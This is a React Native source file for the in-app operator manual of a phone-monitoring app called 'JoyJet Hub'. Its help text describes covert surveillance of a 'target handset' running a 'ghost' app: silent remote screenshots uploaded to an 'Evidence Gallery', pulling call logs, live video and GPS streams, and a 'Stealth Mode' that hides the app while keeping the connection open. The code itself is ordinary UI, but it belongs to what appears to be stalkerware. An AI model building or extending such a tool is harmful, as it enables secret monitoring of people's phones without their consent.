import React from 'react';
import { 
  View, Text, StyleSheet, ScrollView, TouchableOpacity, SafeAreaView, StatusBar 
} from 'react-native';
import { MaterialCommunityIcons } from '@expo/vector-icons';

const GuideScreen = ({ onBack }) => {
  const sections = [
        {
          title: "TRAFFIC LIGHT SYSTEM",
          icon: "traffic-light",
          color: "#F59E0B",
          items: [
            { label: "🟢 GREEN (ACTIVE)", desc: "Node is fully operational and streaming telemetry or video." },
            { label: "🟠 ORANGE (PAUSED)", desc: "Node is in deep sleep mode to save battery. Feeds are off but connection is maintained." },
            { label: "🔴 RED (OFFLINE)", desc: "Node is completely unreachable or dead." }
          ]
        },
        {
          title: "COMMAND PROTOCOLS",
          icon: "console-line",
          color: "#38BDF8",
          items: [
            { label: "PAUSE & RESUME", desc: "Use the pause button to cut off the heavy WebRTC streams and GPS polling to save battery on the target device. Press play to awaken the sensors." },
            { label: "REMOTE SNAPSHOT", desc: "Silently command the ghost node to capture a screenshot and upload it to the Evidence Gallery." },
            { label: "WIPE SESSION", desc: "Force logs out the ghost node, returning the target handset to the login screen securely." }
          ]
        },
        {
          title: "HARDWARE CONTROL",
          icon: "cellphone-link",
          color: "#EF4444",
          items: [
            { label: "PERMANENT BURN (UNINSTALL)", desc: "Long-press ANY node in the top Active Nodes selector. A modal will appear. Confirming the burn will permanently delete the node from the database and force a harsh logout." },
            { label: "STEALTH MODE", desc: "In the Ghost app, clicking 'Go Stealth Mode' will seamlessly exit the app to the background without cutting the socket connection." }
          ]
        },
        {
          title: "EVIDENCE MANAGEMENT",
          icon: "folder-lock",
          color: "#10B981",
          items: [
            { label: "LOCAL DASHBOARD RECORDING", desc: "Click 'CAPTURE FEED' in the Admin stream tab to save a secure local screenshot of the live video straight to your command center's photo gallery." },
            { label: "LOG SYNCING", desc: "Navigate to the CALLS tab and press RE-SYNC DATA to pull the latest 10 phone logs directly off the target ghost handset." }
          ]
        }
      ];
    
      return (
        <SafeAreaView style={styles.container}>
          <StatusBar barStyle="light-content" backgroundColor="#0F172A" />
          
          <View style={styles.header}>
            <TouchableOpacity style={styles.backBtn} onPress={onBack}>
              <MaterialCommunityIcons name="chevron-left" size={24} color="#38BDF8" />
              <Text style={styles.backTxt}>BACK</Text>
            </TouchableOpacity>
            <Text style={styles.headerTitle}>HUB GUIDE</Text>
            <View style={{ width: 60 }} />
          </View>
    
          <ScrollView style={styles.content} showsVerticalScrollIndicator={false}>
            <View style={styles.hero}>
              <MaterialCommunityIcons name="book-open-variant" size={48} color="#38BDF8" />
              <Text style={styles.heroTitle}>OPERATIONAL MANUAL</Text>
              <Text style={styles.heroSub}>JoyJet Hub Secure Infrastructure v4.3.0</Text>
            </View>
    
            {sections.map((section, idx) => (
              <View key={idx} style={styles.section}>
                <View style={styles.sectionHeader}>
                  <MaterialCommunityIcons name={section.icon} size={20} color={section.color} />
                  <Text style={[styles.sectionTitle, { color: section.color }]}>{section.title}</Text>
                </View>
                <View style={styles.card}>
                  {section.items.map((item, iIdx) => (
                    <View key={iIdx} style={[styles.item, iIdx < section.items.length - 1 && styles.border]}>
                      <Text style={[styles.itemLabel, { color: section.color }]}>{item.label}</Text>
                      <Text style={styles.itemDesc}>{item.desc}</Text>
                    </View>
                  ))}
                </View>
              </View>
            ))}
    
            <View style={styles.footer}>
              <Text style={styles.footerText}>ENCRYPTED PROTOCOL 2026 • JOYJET SYSTEMS</Text>
            </View>
            <View style={{ height: 40 }} />
          </ScrollView>
        </SafeAreaView>
      );
    };
    
    const styles = StyleSheet.create({
      container: { flex: 1, backgroundColor: '#0F172A' },
      header: { 
        height: 60, 
        flexDirection: 'row', 
        alignItems: 'center', 
        justifyContent: 'space-between', 
        paddingHorizontal: 16,
        backgroundColor: '#1E293B',
        borderBottomWidth: 1,
        borderBottomColor: '#334155'
      },
      backBtn: { flexDirection: 'row', alignItems: 'center', width: 60 },
      backTxt: { color: '#38BDF8', fontSize: 12, fontWeight: '700', marginLeft: -4 },
      headerTitle: { color: '#F8FAFC', fontSize: 14, fontWeight: '800', letterSpacing: 2 },
    
      content: { flex: 1, padding: 20 },
      hero: { alignItems: 'center', marginBottom: 32, marginTop: 10 },
      heroTitle: { color: '#F8FAFC', fontSize: 20, fontWeight: '900', letterSpacing: 1, marginTop: 12 },
      heroSub: { color: '#64748B', fontSize: 12, marginTop: 4, fontWeight: '600' },
    
      section: { marginBottom: 24 },
      sectionHeader: { flexDirection: 'row', alignItems: 'center', marginBottom: 12, paddingLeft: 4 },
      sectionTitle: { fontSize: 11, fontWeight: '800', letterSpacing: 1.5, marginLeft: 8 },
      
      card: { backgroundColor: '#1E293B', borderRadius: 16, borderWidth: 1, borderColor: '#334155', overflow: 'hidden' },
      item: { padding: 16 },
      border: { borderBottomWidth: 1, borderBottomColor: '#273549' },
      itemLabel: { fontSize: 13, fontWeight: '800', marginBottom: 6, letterSpacing: 0.5 },
      itemDesc: { color: '#94A3B8', fontSize: 11, lineHeight: 18 },
    
      footer: { alignItems: 'center', marginTop: 20, opacity: 0.5 },
      footerText: { color: '#64748B', fontSize: 9, fontWeight: '700', letterSpacing: 1 }
    });

export default GuideScreen;
